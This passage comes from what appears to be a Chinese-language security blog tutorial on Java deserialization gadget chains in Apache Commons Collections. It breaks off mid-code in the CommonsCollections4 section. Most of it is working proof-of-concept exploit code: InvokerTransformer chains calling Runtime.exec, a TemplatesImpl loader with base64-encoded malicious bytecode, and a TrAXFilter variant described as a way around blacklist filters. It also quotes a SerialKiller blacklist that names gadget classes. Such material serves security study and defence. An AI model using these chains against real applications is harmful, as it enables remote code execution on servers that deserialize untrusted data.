<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(queue);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>类 <code>org.apache.commons.collections4.comparators.TransformingComparator</code>，在 commons-collections4.0 以前是版本中是没有实现 <code>Serializable</code> 接口的，无法在序列化中使用。</p>

    </div>
  </div>

<h3 id="CommonsCollections3（…→TrAXFilter→InstantiateTransformer）"><a href="#CommonsCollections3（…→TrAXFilter→InstantiateTransformer）" class="headerlink" title="CommonsCollections3（…→TrAXFilter→InstantiateTransformer）"></a>CommonsCollections3（…→TrAXFilter→InstantiateTransformer）</h3><p>2015 年初，@frohoff 和 @gebl 发布了 Talk《<a class="link"   target="_blank" rel="noopener" href="https://frohoff.github.io/appseccali-marshalling-pickles/" >Marshalling Pickles: how deserializing objects will ruin your day<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>》，以及 Java 反序列化利用工具 ysoserial，随后引爆了安全界。开发者们自然会去找寻一种安全的过滤方法，于是类似 <a class="link"   target="_blank" rel="noopener" href="https://github.com/ikkisoft/SerialKiller" >SerialKiller<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 这样的工具随之诞生。</p>
<p>SerialKiller 是一个 Java 反序列化过滤器，可以通过黑名单与白名单的方式来限制反序列化时允许通过的类。在其发布的第一个版本代码中，我们可以看到其给出了最初的<a class="link"   target="_blank" rel="noopener" href="https://github.com/ikkisoft/SerialKiller/blob/998c0abc5b/config/serialkiller.conf" >黑名单<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- serialkiller.conf --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">refresh</span>&gt;</span>6000<span class="tag">&lt;/<span class="name">refresh</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">blacklist</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s CommonsCollections1 payload  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.apache\.commons\.collections\.functors\.InvokerTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s CommonsCollections2 payload  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.apache\.commons\.collections4\.functors\.InvokerTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s Groovy payload  --&gt;</span>	</span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.codehaus\.groovy\.runtime\.ConvertedClosure$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.codehaus\.groovy\.runtime\.MethodClosure$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s Spring1 payload  --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.springframework\.beans\.factory\.ObjectFactory$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">    <span class="tag">&lt;/<span class="name">blacklist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">whitelist</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>.*<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">whitelist</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>这个黑名单中 <code>InvokerTransformer</code> 赫然在列，也就切断了 <code>CommonsCollections1</code> 的利⽤链。有攻就有防，ysoserial 随后增加了不少新的 Gadgets，其中就包括 CommonsCollections3。</p>
<p>CommonsCollections3 的目的很明显，就是为了绕过一些规则对 <code>InvokerTransformer</code> 的限制。CommonsCollections3 并没有使用到 <code>InvokerTransformer</code> 来调用任意方法，而是用到了另一个类，<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>。</p>
<p>这个类的构造方法中调用了 <code>(TransformerImpl) templates.newTransformer()</code> ，免去了我们使用 <code>InvokerTransformer</code> 手工调用 <code>newTransformer()</code> 方法这一步：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer(); <span class="comment">// &lt;---</span></span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们可以构造如下 <code>ChainedTransformer</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>poc 如下，这个是基于 CC1 的 <code>LazyMap</code> 链，其实这里可以自由组合其他的链，只要能调用到 <code>transform</code> 方法即可。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAxTGNvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAUVGVzdFRyYW5zZm9ybWVyLmphdmEMAAoACwcAKAEAL2NvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAbY29tL2V4YW1wbGUvVGVzdFRyYW5zZm9ybWVyAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAEY2FsYwgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjU0MDQzOTYxNzA2NjcwMAEAIEx5c29zZXJpYWwvUHduZXI1NDA0Mzk2MTcwNjY3MDA7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAHAAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAIgAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAJwAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">defineClass:142, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:346, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:383, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">&lt;init&gt;:64, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">newInstance:408, Constructor (java.lang.reflect)</span><br><span class="line">transform:106, InstantiateTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:123, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:69, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-1, $Proxy1 (com.sun.proxy)</span><br><span class="line">readObject:349, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">...</span><br><span class="line">main:53, CommonsCollections3 (com.example)</span><br></pre></td></tr></table></figure></div>

<h3 id="CommonsCollections4（CC2-TrAXFilter）"><a href="#CommonsCollections4（CC2-TrAXFilter）" class="headerlink" title="CommonsCollections4（CC2+TrAXFilter）"></a>CommonsCollections4（CC2+TrAXFilter）</h3><p>在 CC2 的基础上借助 <code>TrAXFilter</code>+<code>TemplatesImpl</code> 加载字节码绕过对 <code>InvokerTransformer</code> 的过滤，另外我把 <code>TrAXFilter.class</code> 存到 <code>PriorityQueue</code> 中可以避免 <code>Transformer</code> 数组。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] 